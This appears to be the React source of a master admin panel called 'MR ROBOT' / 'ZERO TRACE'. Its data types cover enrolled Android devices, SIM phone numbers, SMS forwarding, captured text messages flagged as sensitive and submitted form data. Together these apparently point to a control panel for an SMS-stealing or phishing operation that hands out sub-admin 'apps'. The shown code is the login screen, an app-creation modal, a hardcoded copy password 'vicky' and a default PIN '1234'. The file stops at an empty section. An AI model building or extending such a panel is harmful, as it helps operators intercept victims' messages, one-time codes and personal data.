import { useState, useEffect, useCallback, useRef, useMemo, memo } from "react";

// Header values must be ISO-8859-1 (Latin-1) only -- the Headers API throws
    // synchronously if they contain other characters (emoji, Rupee sign, Hindi text, etc).
    // A master PIN containing such a character used to crash the whole master
    // panel on load, since it's sent as the "x-master-pin" header on nearly
    // every request. We now strip unsafe header values instead of crashing.
    function isSafeHeaderValue(v: string): boolean {
    return /^[\x20-\x7E]+$/.test(v);
    }

    function apiFetch(url: string, opts: RequestInit = {}): Promise<Response> {
    const h = new Headers();
    const rawHeaders = opts.headers as Record<string, string> | undefined;
    if (rawHeaders) {
      for (const [key, value] of Object.entries(rawHeaders)) {
        if (typeof value === "string" && !isSafeHeaderValue(value)) {
          if (key.toLowerCase() === "x-master-pin") {
            // Corrupted/invalid master PIN -- clear it so the user is prompted
            // to re-enter a valid one instead of the panel crashing.
            sessionStorage.removeItem("mrrobot_master_auth");
          }
          continue; // drop the unsafe header instead of throwing
        }
        h.set(key, value);
      }
    }
    return fetch(url, { ...opts, headers: h });
    }

const T = {
  bg: "#070c1a", card: "#0e1525", cardHover: "#141e30",
  border: "#1a2740", borderLight: "#1f3050",
  text: "#f1f5f9", muted: "#4d6280", mutedLight: "#7a95b4",
  accent: "#6366f1", accentLight: "#818cf8", accentGlow: "rgba(99,102,241,0.15)",
  green: "#22c55e", red: "#ef4444", yellow: "#f59e0b", orange: "#f97316",
  inputBg: "#080e1c", headerBg: "#080e1c",
};

type App = {
  id: number; appId: string; name: string; pin: string;
  status: string; createdAt: string;
  deleteProtectionPin: string | null;
  deleteProtectionEnabled: boolean;
};
type FullDevice = {
  id: number; deviceId: string; appId: string; userId: string; name: string;
  androidVersion: number;
  sim1Carrier: string | null; sim1Phone: string | null;
  sim2Carrier: string | null; sim2Phone: string | null;
  status: string; lastOnline: string | null;
  forwardEnabled: boolean; forwardSlot: number | null;
  hasFcm: boolean; fcmToken: string | null; installedAt: string;
};
type MsgRow = {
  id: number; appId: string; deviceId: string; userId: string;
  fromSender: string; fromNumber: string; toNumber?: string | null; body: string;
  isSensitive: boolean; receivedAt: string;
};
type GroupRow = {
  id: number; appId: string; deviceId: string;
  data: Record<string, unknown>; submittedAt: string;
};
type SessionRow = {
  id: string; appId: string; loginTime: string; lastActive: string;
  userAgent: string; ip: string; device: string;
};
type MasterSession = {
  id: string; ip: string; userAgent: string; loginAt: string;
};

function generateAppId() {
  const c = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
  const s = (n: number) => Array.from({ length: n }, () => c[Math.floor(Math.random() * c.length)]).join("");
  return `APP-${s(4)}-${s(4)}-${s(4)}`;
}
function fmtAgo(iso: string | null | undefined): string {
  if (!iso) return "Never";
  const diff = Date.now() - new Date(iso).getTime();
  if (diff <= 0) return "just now"; // future timestamp / clock skew
  if (diff < 60000) return `${Math.floor(diff / 1000)}s ago`;
  if (diff < 3600000) return `${Math.floor(diff / 60000)}m ago`;
  if (diff < 86400000) return `${Math.floor(diff / 3600000)}h ago`;
  return `${Math.floor(diff / 86400000)}d ago`;
}
function fmtDate(iso: string): string {
  const d = new Date(iso);
  return d.toLocaleDateString("en-IN", { day: "2-digit", month: "short", year: "numeric" }) + " " + d.toLocaleTimeString("en-IN", { hour: "2-digit", minute: "2-digit", hour12: true });
}
function copyToClipboard(text: string): Promise<void> {
  if (navigator.clipboard) return navigator.clipboard.writeText(text);
  const el = document.createElement("textarea");
  el.value = text; el.style.position = "fixed"; el.style.opacity = "0";
  document.body.appendChild(el); el.select();
  document.execCommand("copy"); document.body.removeChild(el);
  return Promise.resolve();
}

/* ── Icons ── */
const Ic = {
  Shield: () => (<svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>),
  Lock: () => (<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>),
  Eye: () => (<svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>),
  EyeOff: () => (<svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/></svg>),
  Alert: () => (<svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>),
  ArrowRight: () => (<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg>),
  X: () => (<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>),
  Refresh: () => (<svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round"><polyline points="23 4 23 10 17 10"/><path d="M20.49 15a9 9 0 1 1-2.12-9.36L23 10"/></svg>),
  Copy: () => (<svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>),
  Check: () => (<svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><polyline points="20 6 9 17 4 12"/></svg>),
  Layers: () => (<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"><polygon points="12 2 2 7 12 12 22 7 12 2"/><polyline points="2 17 12 22 22 17"/><polyline points="2 12 12 17 22 12"/></svg>),
  CheckCircle: () => (<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>),
  XCircle: () => (<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"><circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/></svg>),
  Pencil: () => (<svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round"><path d="M11 4H4a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7"/><path d="M18.5 2.5a2.121 2.121 0 0 1 3 3L12 15l-4 1 1-4 9.5-9.5z"/></svg>),
  Power: () => (<svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round"><path d="M18.36 6.64a9 9 0 1 1-12.73 0"/><line x1="12" y1="2" x2="12" y2="12"/></svg>),
  Trash: () => (<svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round"><polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a1 1 0 0 1 1-1h4a1 1 0 0 1 1 1v2"/></svg>),
  Key: () => (<svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round"><path d="M21 2l-2 2m-7.61 7.61a5.5 5.5 0 1 1-7.778 7.778 5.5 5.5 0 0 1 7.777-7.777zm0 0L15.5 7.5m0 0l3 3L22 7l-3-3m-3.5 3.5L19 4"/></svg>),
  LogOut: () => (<svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/><polyline points="16 17 21 12 16 7"/><line x1="21" y1="12" x2="9" y2="12"/></svg>),
  CalendarPlus: () => (<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/><line x1="12" y1="15" x2="12" y2="19"/><line x1="10" y1="17" x2="14" y2="17"/></svg>),
  Search: () => (<svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>),
  Plus: () => (<svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg>),
  Inbox: () => (<svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round"><polyline points="22 12 16 12 14 15 10 15 8 12 2 12"/><path d="M5.45 5.11L2 12v6a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2v-6l-3.45-6.89A2 2 0 0 0 16.76 4H7.24a2 2 0 0 0-1.79 1.11z"/></svg>),
  Loader: () => (<svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" style={{ animation: "spin 0.9s linear infinite" }}><line x1="12" y1="2" x2="12" y2="6"/><line x1="12" y1="18" x2="12" y2="22"/><line x1="4.93" y1="4.93" x2="7.76" y2="7.76"/><line x1="16.24" y1="16.24" x2="19.07" y2="19.07"/><line x1="2" y1="12" x2="6" y2="12"/><line x1="18" y1="12" x2="22" y2="12"/><line x1="4.93" y1="19.07" x2="7.76" y2="16.24"/><line x1="16.24" y1="7.76" x2="19.07" y2="4.93"/></svg>),
  CPU: () => (<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"><rect x="4" y="4" width="16" height="16" rx="2" ry="2"/><rect x="9" y="9" width="6" height="6"/><line x1="9" y1="1" x2="9" y2="4"/><line x1="15" y1="1" x2="15" y2="4"/><line x1="9" y1="20" x2="9" y2="23"/><line x1="15" y1="20" x2="15" y2="23"/><line x1="20" y1="9" x2="23" y2="9"/><line x1="20" y1="14" x2="23" y2="14"/><line x1="1" y1="9" x2="4" y2="9"/><line x1="1" y1="14" x2="4" y2="14"/></svg>),
  Smartphone: () => (<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect x="5" y="2" width="14" height="20" rx="2" ry="2"/><line x1="12" y1="18" x2="12.01" y2="18"/></svg>),
  Wifi: () => (<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M5 12.55a11 11 0 0 1 14.08 0"/><path d="M1.42 9a16 16 0 0 1 21.16 0"/><path d="M8.53 16.11a6 6 0 0 1 6.95 0"/><line x1="12" y1="20" x2="12.01" y2="20"/></svg>),
  MessageSquare: () => (<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>),
  Database: () => (<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><ellipse cx="12" cy="5" rx="9" ry="3"/><path d="M21 12c0 1.66-4 3-9 3s-9-1.34-9-3"/><path d="M3 5v14c0 1.66 4 3 9 3s9-1.34 9-3V5"/></svg>),
  Settings: () => (<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1-2.83 2.83l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-4 0v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83-2.83l.06-.06A1.65 1.65 0 0 0 4.68 15a1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1 0-4h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 2.83-2.83l.06.06A1.65 1.65 0 0 0 9 4.68a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 4 0v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 2.83l-.06.06A1.65 1.65 0 0 0 19.4 9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 0 4h-.09a1.65 1.65 0 0 0-1.51 1z"/></svg>),
  ChevronDown: () => (<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><polyline points="6 9 12 15 18 9"/></svg>),
  ChevronRight: () => (<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><polyline points="9 18 15 12 9 6"/></svg>),
  Send: () => (<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><line x1="22" y1="2" x2="11" y2="13"/><polygon points="22 2 15 22 11 13 2 9 22 2"/></svg>),
  PhoneForwarded: () => (<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><polyline points="19 1 23 5 19 9"/><line x1="15" y1="5" x2="23" y2="5"/><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07A19.5 19.5 0 0 1 4.69 13a19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 3.6 2.31h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L7.91 9.91a16 16 0 0 0 6.16 6.16l.91-.91a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 17v-.08z"/></svg>),
  Hash: () => (<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><line x1="4" y1="9" x2="20" y2="9"/><line x1="4" y1="15" x2="20" y2="15"/><line x1="10" y1="3" x2="8" y2="21"/><line x1="16" y1="3" x2="14" y2="21"/></svg>),
  SmartphoneSm: () => (<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect x="5" y="2" width="14" height="20" rx="2" ry="2"/><line x1="12" y1="18" x2="12.01" y2="18"/></svg>),
  Link: () => (<svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>),
  LogOut2: () => (<svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/><polyline points="16 17 21 12 16 7"/><line x1="21" y1="12" x2="9" y2="12"/></svg>),
};

/* ── Base UI ── */
function CopyBtn({ value, label = "Copy" }: { value: string; label?: string }) {
  const [copied, setCopied] = useState(false);
  function handleCopy(e: React.MouseEvent) {
    e.stopPropagation();
    copyToClipboard(value).then(() => { setCopied(true); setTimeout(() => setCopied(false), 2000); });
  }
  return (
    <button onClick={handleCopy} title={`Copy ${label}`} style={{ display: "inline-flex", alignItems: "center", justifyContent: "center", padding: "3px 9px", borderRadius: 6, border: `1px solid ${copied ? T.green + "60" : T.borderLight}`, background: copied ? T.green + "18" : T.border + "80", color: copied ? T.green : T.mutedLight, cursor: "pointer", fontSize: 11, fontWeight: 600, gap: 5, transition: "all 0.15s", whiteSpace: "nowrap" }}>
      {copied ? <Ic.Check /> : <Ic.Copy />}{copied ? "Copied" : label}
    </button>
  );
}

/* ── PIN Copy Button — requires "vicky" password ── */
function PinCopyBtn({ value }: { value: string }) {
  const [state, setState] = useState<"idle"|"asking"|"copied">("idle");
  const [pass, setPass] = useState(""); const [err, setErr] = useState("");
  const inputRef = useRef<HTMLInputElement>(null);
  function open(e: React.MouseEvent) { e.stopPropagation(); setState("asking"); setPass(""); setErr(""); setTimeout(() => inputRef.current?.focus(), 50); }
  function cancel(e: React.MouseEvent) { e.stopPropagation(); setState("idle"); setPass(""); setErr(""); }
  function submit(e: React.FormEvent) {
    e.preventDefault(); e.stopPropagation();
    if (pass === "vicky") {
      copyToClipboard(value).then(() => { setState("copied"); setTimeout(() => setState("idle"), 2000); });
    } else { setErr("Galat password"); setPass(""); setTimeout(() => inputRef.current?.focus(), 50); }
  }
  if (state === "copied") return (
    <span style={{ display: "inline-flex", alignItems: "center", gap: 4, padding: "3px 9px", borderRadius: 6, background: T.green + "18", border: `1px solid ${T.green}60`, color: T.green, fontSize: 11, fontWeight: 600 }}><Ic.Check /> Copied</span>
  );
  if (state === "asking") return (
    <form onSubmit={submit} onClick={e => e.stopPropagation()} style={{ display: "inline-flex", alignItems: "center", gap: 5, position: "relative" }}>
      <input ref={inputRef} type="password" value={pass} onChange={e => { setPass(e.target.value); setErr(""); }} placeholder="password" style={{ width: 90, padding: "3px 8px", borderRadius: 6, border: `1px solid ${err ? "#ef4444" : T.borderLight}`, background: T.inputBg, color: T.text, fontSize: 11, outline: "none" }} />
      <button type="submit" style={{ padding: "3px 8px", borderRadius: 6, background: "linear-gradient(135deg,#5254d4,#7c3aed)", border: "none", color: "#fff", fontSize: 11, fontWeight: 700, cursor: "pointer" }}>OK</button>
      <button type="button" onClick={cancel} style={{ padding: "3px 6px", borderRadius: 6, background: T.border, border: `1px solid ${T.borderLight}`, color: T.muted, fontSize: 11, cursor: "pointer" }}>✕</button>
      {err && <span style={{ position: "absolute", top: "100%", left: 0, fontSize: 10, color: "#ef4444", whiteSpace: "nowrap", marginTop: 2 }}>{err}</span>}
    </form>
  );
  return (
    <button onClick={open} title="Copy PIN" style={{ display: "inline-flex", alignItems: "center", justifyContent: "center", padding: "3px 9px", borderRadius: 6, border: `1px solid ${T.borderLight}`, background: T.border + "80", color: T.mutedLight, cursor: "pointer", fontSize: 11, fontWeight: 600, gap: 5, whiteSpace: "nowrap" }}>
      <Ic.Copy />PIN
    </button>
  );
}
function Modal({ children, onClose, maxWidth = 420 }: { children: React.ReactNode; onClose: () => void; maxWidth?: number }) {
  return (
    <div style={{ position: "fixed", inset: 0, background: "rgba(0,0,0,.80)", display: "flex", alignItems: "center", justifyContent: "center", zIndex: 100, padding: 16, backdropFilter: "blur(3px)" }}
      onClick={e => { if (e.target === e.currentTarget) onClose(); }}>
      <div style={{ width: "100%", maxWidth, background: T.card, borderRadius: 20, padding: "26px 28px 24px", border: `1px solid ${T.borderLight}`, boxShadow: "0 24px 64px rgba(0,0,0,.6)" }}>
        {children}
      </div>
    </div>
  );
}
function ModalHeader({ title, icon, onClose }: { title: string; icon?: React.ReactNode; onClose: () => void }) {
  return (
    <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: 22 }}>
      <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
        {icon && <div style={{ color: T.accentLight }}>{icon}</div>}
        <div style={{ fontSize: 17, fontWeight: 800, color: T.text }}>{title}</div>
      </div>
      <button onClick={onClose} style={{ background: T.border, border: "none", color: T.mutedLight, cursor: "pointer", width: 28, height: 28, borderRadius: 8, display: "flex", alignItems: "center", justifyContent: "center" }}><Ic.X /></button>
    </div>
  );
}
const inpBase: React.CSSProperties = { width: "100%", marginTop: 6, padding: "11px 14px", borderRadius: 10, border: `1.5px solid ${T.borderLight}`, background: T.inputBg, color: T.text, fontSize: 14, outline: "none", boxSizing: "border-box", transition: "border-color 0.15s" };
function FieldLabel({ children }: { children: React.ReactNode }) { return <label style={{ fontSize: 10, color: T.mutedLight, fontWeight: 700, letterSpacing: 1.2, textTransform: "uppercase" }}>{children}</label>; }
function ErrBanner({ msg }: { msg: string }) { return <div style={{ display: "flex", alignItems: "center", gap: 8, color: T.red, fontSize: 12, marginBottom: 10, background: T.red + "12", padding: "9px 13px", borderRadius: 9, border: `1px solid ${T.red}30` }}><Ic.Alert /> {msg}</div>; }
function Spinner({ size = 14 }: { size?: number }) { return <div style={{ display: "inline-block", width: size, height: size, border: "2px solid currentColor", borderTopColor: "transparent", borderRadius: "50%", animation: "spin 0.7s linear infinite" }} />; }

/* ── Login Screen ── */
function MasterLogin({ onAuth }: { onAuth: (pin: string, sessionId: string) => void }) {
  const [pin, setPin] = useState("");
  const [err, setErr] = useState("");
  const [loading, setLoading] = useState(false);
  const [showPin, setShowPin] = useState(false);
  async function handleSubmit(e: React.FormEvent) {
    e.preventDefault(); setErr(""); setLoading(true);
    try {
      const r = await apiFetch("/api/admin/verify-master-pin", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ pin }) });
      if (!r.ok) { const j = await r.json() as { error?: string }; setErr(j.error ?? "Wrong master PIN. Try again."); setPin(""); return; }
      const j = await r.json() as { sessionId?: string };
      onAuth(pin, j.sessionId ?? "");
    } catch { setErr("Network error. Try again."); } finally { setLoading(false); }
  }
  return (
    <div style={{ minHeight: "100vh", background: `radial-gradient(ellipse at 65% 15%, rgba(99,102,241,0.14) 0%, transparent 55%), radial-gradient(ellipse at 15% 85%, rgba(139,92,246,0.10) 0%, transparent 50%), ${T.bg}`, display: "flex", alignItems: "center", justifyContent: "center", fontFamily: "'Inter', system-ui, sans-serif", padding: "20px" }}>
      <div style={{ width: "100%", maxWidth: 400, background: T.card, borderRadius: 24, padding: "44px 40px 36px", border: `1px solid ${T.borderLight}`, boxShadow: "0 32px 80px rgba(0,0,0,.7)" }}>
        <div style={{ textAlign: "center", marginBottom: 36 }}>
          <div style={{ width: 68, height: 68, borderRadius: 20, margin: "0 auto 18px", background: "linear-gradient(145deg, #4f52d4, #7c3aed)", display: "flex", alignItems: "center", justifyContent: "center", color: "#fff", boxShadow: "0 12px 32px rgba(99,102,241,0.45)" }}><Ic.Shield /></div>
          <div style={{ fontSize: 22, fontWeight: 900, color: T.text }}>MR ROBOT</div>
          <div style={{ display: "inline-flex", alignItems: "center", gap: 6, marginTop: 10, fontSize: 10, color: T.accentLight, background: "rgba(99,102,241,0.12)", padding: "4px 14px", borderRadius: 99, border: "1px solid rgba(99,102,241,0.25)", fontWeight: 700, letterSpacing: 2, textTransform: "uppercase" }}>
            <span style={{ width: 5, height: 5, borderRadius: "50%", background: T.accentLight, display: "inline-block" }} />Master Admin
          </div>
        </div>
        <form onSubmit={handleSubmit}>
          <label style={{ fontSize: 10, color: T.mutedLight, fontWeight: 700, letterSpacing: 1.5, textTransform: "uppercase", display: "flex", alignItems: "center", gap: 6 }}><Ic.Lock /> Master PIN</label>
          <div style={{ position: "relative", marginTop: 8, marginBottom: 6 }}>
            <input type={showPin ? "text" : "password"} value={pin} onChange={e => setPin(e.target.value)} placeholder="Enter master PIN" autoFocus
              style={{ ...inpBase, marginTop: 0, paddingRight: 46, fontFamily: pin && !showPin ? "monospace" : "inherit", letterSpacing: pin && !showPin ? 4 : "normal" }} />
            <button type="button" onClick={() => setShowPin(v => !v)} style={{ position: "absolute", right: 13, top: "50%", transform: "translateY(-50%)", background: "none", border: "none", color: showPin ? T.accentLight : T.muted, cursor: "pointer", padding: 4, display: "flex", alignItems: "center" }}>
              {showPin ? <Ic.EyeOff /> : <Ic.Eye />}
            </button>
          </div>
          {err && <ErrBanner msg={err} />}
          <button type="submit" disabled={loading || !pin} style={{ width: "100%", marginTop: 20, padding: "14px 0", borderRadius: 12, background: pin && !loading ? "linear-gradient(135deg, #5254d4, #7c3aed)" : T.borderLight, color: pin && !loading ? "#fff" : T.muted, fontWeight: 800, fontSize: 14, border: "none", cursor: pin && !loading ? "pointer" : "default", display: "flex", alignItems: "center", justifyContent: "center", gap: 8 }}>
            {loading ? (<><Spinner /> Verifying…</>) : (<>Unlock Panel <Ic.ArrowRight /></>)}
          </button>
        </form>
        <div style={{ textAlign: "center", marginTop: 22, fontSize: 11, color: T.muted }}>MR ROBOT Control Panel · Secure Access</div>
      </div>
      <style>{`@keyframes spin{to{transform:rotate(360deg)}} @keyframes ma-pulse{0%,100%{opacity:1}50%{opacity:0.55}} *{box-sizing:border-box}`}</style>
    </div>
  );
}

/* ── Create App Modal ── */
function CreateAppModal({ masterPin, onClose, onCreated }: { masterPin: string; onClose: () => void; onCreated: (a: App) => void }) {
  const [name, setName] = useState("MR ROBOT");
  const [appId, setAppId] = useState(generateAppId);
  const [pin, setPin] = useState("1234");
  const [err, setErr] = useState(""); const [loading, setLoading] = useState(false);
  async function handleSubmit(e: React.FormEvent) {
    e.preventDefault();
    if (!name.trim() || !pin.trim()) { setErr("All fields required"); return; }
    if (pin.length < 4) { setErr("PIN must be at least 4 characters"); return; }
    setErr(""); setLoading(true);
    try {
      const r = await apiFetch("/api/master/apps", { method: "POST", headers: { "Content-Type": "application/json", "x-master-pin": masterPin }, body: JSON.stringify({ appId, name: name.trim(), pin }) });
      if (!r.ok) { const j = await r.json() as { error?: string }; setErr(j.error ?? "Failed"); return; }
      onCreated(await r.json() as App);
    } catch { setErr("Network error"); } finally { setLoading(false); }
  }
  return (
    <Modal onClose={onClose}>
      <ModalHeader title="Create Sub-Admin App" onClose={onClose} />
      <form onSubmit={handleSubmit}>
        <div style={{ marginBottom: 14 }}>
          <FieldLabel>Version</FieldLabel>
          <div style={{ display: "flex", gap: 8, marginTop: 8 }}>
            {(["MR ROBOT", "ZERO TRACE"] as const).map(n => (
              <button key={n} type="button" onClick={() => setName(n)} style={{ flex: 1, padding: "14px 8px", borderRadius: 12, border: `2px solid ${name === n ? T.accent : T.borderLight}`, background: name === n ? T.accentGlow : T.border, cursor: "pointer", display: "flex", flexDirection: "column", alignItems: "center", gap: 5, transition: "all 0.15s" }}>
                <span style={{ fontSize: 22 }}>{n === "MR ROBOT" ? "🤖" : "👁️"}</span>
                <span style={{ fontSize: 12, fontWeight: 800, color: name === n ? T.accentLight : T.muted }}>{n}</span>
              </button>
            ))}
          </div>
        </div>
        <div style={{ marginBottom: 14 }}>
          <FieldLabel>App ID</FieldLabel>
          <div style={{ display: "flex", gap: 6, marginTop: 6 }}>
            <input type="text" value={appId} onChange={e => setAppId(e.target.value)} style={{ ...inpBase, marginTop: 0, flex: 1, fontFamily: "monospace", fontSize: 12 }} />
            <button type="button" onClick={() => setAppId(generateAppId())} style={{ padding: "0 14px", borderRadius: 10, background: T.border, border: `1px solid ${T.borderLight}`, color: T.mutedLight, cursor: "pointer", display: "flex", alignItems: "center", gap: 6, fontSize: 12, fontWeight: 600, whiteSpace: "nowrap" }}><Ic.Refresh /> New</button>
          </div>
        </div>
        <div style={{ marginBottom: 14 }}><FieldLabel>Login PIN</FieldLabel><input type="password" value={pin} onChange={e => setPin(e.target.value)} placeholder="min 4 characters" style={inpBase} /></div>
        {err && <ErrBanner msg={err} />}
        <div style={{ display: "flex", gap: 10, marginTop: 20 }}>
          <button type="button" onClick={onClose} style={{ flex: 1, padding: "12px 0", borderRadius: 10, background: T.border, border: `1px solid ${T.borderLight}`, color: T.text, fontWeight: 700, cursor: "pointer", fontSize: 13 }}>Cancel</button>
          <button type="submit" disabled={loading} style={{ flex: 1, padding: "12px 0", borderRadius: 10, background: "linear-gradient(135deg,#5254d4,#7c3aed)", border: "none", color: "#fff", fontWeight: 700, cursor: loading ? "default" : "pointer", fontSize: 13 }}>{loading ? "Creating…" : "Create App"}</button>
        </div>
      </form>
    </Modal>
  );
}

/* ── Change Master PIN Modal ── */
